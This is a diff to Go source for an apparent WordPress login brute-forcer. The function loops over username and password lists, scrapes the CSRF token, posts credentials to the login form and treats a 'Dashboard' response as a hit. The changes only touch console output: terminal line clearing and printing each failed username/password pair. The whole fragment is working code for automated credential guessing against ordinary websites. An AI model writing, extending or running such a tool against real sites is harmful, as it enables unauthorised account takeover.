@@ -120,13 +120,12 @@ func (ArgVar *ArgVar)WordpressLogin()(string,string){
 			return "",""
 		}
 		if strings.Contains(string(body), "Dashboard") {
+			fmt.Print("\033[G\033[K")
 			fmt.Println("🥋️ Login successful")
 			fmt.Println(strings.Repeat("=", 30))
 			return ArgVar.User,ArgVar.Pass
 		} else {
-			fmt.Println("Login failed")
-			fmt.Println("Response Status:", resp.Status)
-			fmt.Println("Response Headers:", resp.Header)
+			fmt.Printf("❌ Unable to login USERNAME %s  PASSWORD %s\n", ArgVar.User,ArgVar.Pass)		
 		}		
 	
     }else if ArgVar.User !="" && ArgVar.PassList !=""{
@@ -170,7 +169,6 @@ func (ArgVar *ArgVar)WordpressLogin()(string,string){
 						csrfToken = bodyStr[start : start+end]
 					}
 				}
-	    		fmt.Println(index)
 		    	data := url.Values{}
 				data.Set("log", ArgVar.User)
 				data.Set("pwd", Passlog[index])
@@ -197,15 +195,16 @@ func (ArgVar *ArgVar)WordpressLogin()(string,string){
 					return "",""
 				}
 				if strings.Contains(string(body), "Dashboard") {
+					fmt.Print("\033[G\033[K")
 					fmt.Println("🥋️ Login successful")
 					fmt.Println(strings.Repeat("=", 30))
 					return ArgVar.User,Passlog[index]
 				} else {
-					fmt.Println("Login failed")
-					fmt.Println("Response Status:", resp.Status)
-					fmt.Println("Response Headers:", resp.Header)
+					fmt.Print("\033[G\033[K")
+					fmt.Printf("❌ Unable to login USERNAME %s  PASSWORD %s", ArgVar.User,Passlog[index])	
+				
 				}		  
-        }
+            }
     }else if ArgVar.Pass !="" && ArgVar.UserList !=""{
     	 UserLog, _ :=ArgVar.ListUserWordpress()
 	    	for index := range(UserLog){
@@ -247,7 +246,6 @@ func (ArgVar *ArgVar)WordpressLogin()(string,string){
 						csrfToken = bodyStr[start : start+end]
 					}
 				}
-	    		fmt.Println(index)
 		    	data := url.Values{}
 				data.Set("log", UserLog[index])
 				data.Set("pwd", ArgVar.Pass)
@@ -274,15 +272,17 @@ func (ArgVar *ArgVar)WordpressLogin()(string,string){
 					return "",""
 				}
 				if strings.Contains(string(body), "Dashboard") {
+					fmt.Print("\033[G\033[K")
 					fmt.Println("🥋️ Login successful")
 					fmt.Println(strings.Repeat("=", 30))
 					return UserLog[index],ArgVar.Pass
 				} else {
-					fmt.Println("Login failed")
-					fmt.Println("Response Status:", resp.Status)
-					fmt.Println("Response Headers:", resp.Header)
+					fmt.Print("\033[G\033[K")
+					fmt.Printf("❌ Unable to login USERNAME %s  PASSWORD %s", UserLog[index],ArgVar.Pass)
+
+					
 				}		  
-               }
+            }
     }else if ArgVar.UserList != "" && ArgVar.PassList !=""{
     	UserList , PassList := ArgVar.ListUserWordpress()
     	for IndexU := range UserList {
@@ -325,8 +325,8 @@ func (ArgVar *ArgVar)WordpressLogin()(string,string){
 						csrfToken = bodyStr[start : start+end]
 					}
 				}
-	    		    fmt.Println("")
-		        	data := url.Values{}
+	    		fmt.Println("")
+		        data := url.Values{}
 				data.Set("log", UserList[IndexU] )
 				data.Set("pwd", PassList[IndexP])
 				data.Set("wp-submit", "Log In")
@@ -352,13 +352,14 @@ func (ArgVar *ArgVar)WordpressLogin()(string,string){
 					return "",""
 				}
 				if strings.Contains(string(body), "Dashboard") {
+					fmt.Print("\033[G\033[K")
 					fmt.Println("🥋️ Login successful")
 					fmt.Println(strings.Repeat("=", 30))
 					return UserList[IndexU] ,PassList[IndexP]
-				} else {
-					fmt.Println("Login failed")
-					fmt.Println("Response Status:", resp.Status)
-					fmt.Println("Response Headers:", resp.Header)
+				} else{
+				    fmt.Print("\033[G\033[K")
+					fmt.Printf("❌ Unable to login USERNAME %s  PASSWORD %s", UserList[IndexU] ,PassList[IndexP])	
+					
 				}
 			}			  
         }
